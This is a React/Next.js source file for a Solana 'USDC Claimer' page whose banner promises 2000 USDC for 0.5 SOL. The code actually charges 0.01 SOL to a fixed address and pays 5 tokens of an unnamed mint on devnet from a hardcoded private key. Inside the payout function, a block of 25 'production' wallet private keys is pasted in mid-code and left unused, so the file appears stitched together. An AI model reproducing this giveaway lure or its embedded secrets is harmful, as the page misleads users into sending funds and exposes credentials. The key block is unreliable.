/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4e7zvWkGYoUhzeBJW65G27Abs13pTKTDpafXPs11uByqW6VzqcUAVgwcGo14ruLzFriQZcCUiwWyQCxDjx1Lhzd"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4fbNJS5ViqGoyz1imEULWdJtm3XZU399bEqCsMSwMq52E1vvk1Rkb95DubU4GEnyWHxLfzhLgbu9nFutowcRmYBF",
  "key1": "4zuwyDPin5mNNi8g87NKmUfZcMjsiK3tBzuwXEcVaeuk2Rm8ghuWDvGivpAAEPmcsQGtDSGUDZX6cwzwZTLtuKyB",
  "key2": "5UFQ4x3gnfgNeDXxnSyMWbsuAwtd2J71UwGCdd3qoQ1HU3YoJt8tHJXLNBSXxF2a6fSnX3c1Rkz3pnMhN6Qk3Er8",
  "key3": "5kJSdcYgU6hYWaQsCe3nimXKkkk4Brh9XuFQofmHNw1E34jAduEnDrbxaCn8u4B5UhmNngiVX8DhaJg1EvtCBz7t",
  "key4": "4H4X6pjvj2usasU1p3WsAM1yFqMZ7JZ4vSvfPcFzkc1RaTWPJC1toxXE9BLEjPRyaR2Hjx8PVTdZVf4i1ry8tcWQ",
  "key5": "4Z56ffa4uHuAwhVaESvG2kG33FfiYEjdyJDynMJggG4x5FvzL6pb2UhVxAHAbMmKPvYBH9YcH91Nju8NogoLM8fR",
  "key6": "5vff7MvZckgmfas1bwUhiPxn4M2rCVyv69YmyM6nzwStBcXLvEazp6yoDQv1J7gdqbnHPH7JMfMAbCwxZjCuBqdu",
  "key7": "3xz4t51DG7DUbXQVFUbxFdza9g9p7g6VEeDWWY64D8ncMCwLXn9S4R4zh6pdrGPMXaiitu5HZHdRmWaKVt9dSndP",
  "key8": "44oiDN1YFSb9TsR91CSygsHP3timTChqZv567tz6gdtJPHUTvjvE9Ft1G2tiBupTeL3pAsQE5P77t2ByBcM4S6fi",
  "key9": "2r9kv9smgzw1V43YPrmoTBnwgAd1KeuxjKdmvxJWHLCJ4ZnPp7h8HwJ1FK8RQJahL3KvxCGgJANAsQGCbbrduWDg",
  "key10": "5pLqP7H4bim3XW5ELVKniYb4TJnsDoBqatZkG1gJscqK7WMp3PcFYFrTyUGtoktd9LgQ9szzWZ4fMoTSoUuvYvqk",
  "key11": "MYuDSLebf7UbsFgsHH4Ek8tSsqiWavzTPkvHB56XhsKy5NoERLURUVL9Gygw69DYmJq5CNFwGgxYVFYUwZVEBjX",
  "key12": "65kCZkyHuiCxWzdd26fnsUANwLfXYgHTTrNM8qLVoTay8g6EaVdHBxhLUbZUgEFGPXM6V3q8XWbZQz4yEye47Qij",
  "key13": "3eqiCsnPVPocsz1yuCn2vyYBzQK4VENCHn32drJh2HzWk3U8V22i5owiJhFL8bJ39m5f28n4aKouRqnCyr7DWT9g",
  "key14": "44bwjNdYGCiqEoQrn2twM5ZvYpbLSYo55WHP6hzfVTdSdjEY3Tj5mSnWnRcH4397EMMmL7dZyqPr2BR7DqRvys6x",
  "key15": "3pNFJdZeXtp6PU3FZGhwa6uSsuwkeH2hLoMtk7Sfg61jKy9Mub8vfjTfijp3ffPcpDh62Eh2Q9piQUFtMqX6spXf",
  "key16": "3kPVJfJAYZ8vk8unZLvpwLhuUWcS2YYtMs2EUQwbzmy9vAeKKjqQ6BuoSp7zvs5DbQzGZWh37TFpJytSKKMMxboc",
  "key17": "qGRHDUbmQ3DKaBuJEy3FBVAABPeipFMBDQNSG9FrugfvL6rivxCj28JgigTELjunFtF7pskismrnYi5VT8TQnaY",
  "key18": "41xjitjdXLnkFhV2nQLWdR7ELY2GfKPZfcSCNavCEfQNhJA8QzJuxoueEAVw5r9rWVdoMQicYJCU7qZzXBV6PTo",
  "key19": "ndkmoPDzNSeKtBQbBvuJ9QDRfNfcSqsRfJFQvPVUMp7DTpoKSzdTtf2dn6KZ65R2gmbfyeJi7jg3c7GdLh4zHJN",
  "key20": "3mdQK9HQgpXpkNCWWVbpHo72FZqsDkWEUN46FnzVZfeEXHNCQ1E8cPA8R5kT5Wv4j3gb52g3QZeM6AMrbCAMTCet",
  "key21": "5XEpaaPkX2EgRXmgrbpBdrQYYHbg18t6wDTXYdoxEUL937ZWS3GACKRY98SoWa8fQ3GCE7ttjS92zvxgK5i1azTu",
  "key22": "2wgz4bE3VogGtwJxYp4mbDpHW3EW2pF8a3Sf2mh2KtB8rKqC17GCErSYGwR4y2MWwiBhnpbDLaE27tpcDPo4ZedN",
  "key23": "3ZV8sRPqb2BrvU82FpuHjmyXHVrcp8wycHaHosV8g2vi9mR48diWjwpBnsDX2zjzVeSDt5aCbHetUU8gc1nbHUYh",
  "key24": "3GYrA66n7PDwKzLc26QNfhsNdmGnxTffPprMur9pVVWHBNmLQQ3ZSSP1S86gZrXGbZctGx1eP6urz6XknWurCbdK"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
